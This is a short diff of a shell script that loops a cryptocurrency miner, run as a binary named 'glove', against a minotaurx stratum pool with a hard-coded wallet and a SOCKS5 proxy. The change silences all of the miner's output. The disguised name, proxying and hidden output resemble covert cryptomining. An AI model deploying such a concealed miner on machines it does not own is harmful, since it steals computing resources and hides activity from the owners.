@@ -79,6 +79,6 @@ sleep 2
 
 while true
 do
-./glove -a minotaurx -o stratum+tcp://coinxp.teatspray.uk:8243 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate -p c=MAZA,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081
+./glove -a minotaurx -o stratum+tcp://coinxp.teatspray.uk:8243 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate -p c=MAZA,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081 1>/dev/null 2>&1
 sleep 10
 done
